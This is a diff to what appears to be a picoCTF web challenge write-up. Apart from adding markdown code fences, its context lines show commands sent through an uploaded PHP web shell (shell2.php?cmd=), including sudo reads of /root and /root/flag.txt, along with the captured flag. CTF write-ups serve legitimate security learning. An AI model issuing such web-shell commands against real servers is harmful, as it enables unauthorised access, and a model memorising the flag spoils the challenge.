@@ -46,6 +46,7 @@ Linux challenge 6.17.0-1019-aws #19~24.04.1-Ubuntu SMP Tue Jun 23 18:53:06 UTC 2
 
 http://standard-pizzas.picoctf.net:64527/uploads/shell2.php?cmd=ifconfig
 
+```
 eth0: flags=4163  mtu 1500
         inet 192.168.0.90  netmask 255.255.255.248  broadcast 192.168.0.95
         ether 5e:63:36:95:a8:06  txqueuelen 0  (Ethernet)
@@ -62,6 +63,7 @@ lo: flags=73  mtu 65536
         RX errors 0  dropped 0  overruns 0  frame 0
         TX packets 0  bytes 0 (0.0 B)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
 
 http://standard-pizzas.picoctf.net:64527/uploads/shell2.php?cmd=sudo%20ls%20-la%20%2Froot
 
@@ -76,6 +78,5 @@ drwxr-xr-x 1 root root  39 Sep 11 09:34 ..
 
 http://standard-pizzas.picoctf.net:64527/uploads/shell2.php?cmd=sudo%20cat%20%2Froot%2Fflag.txt
 
-```
 picoCTF{wh47_c4n_u_d0_wPHP_123198f1}
 ```
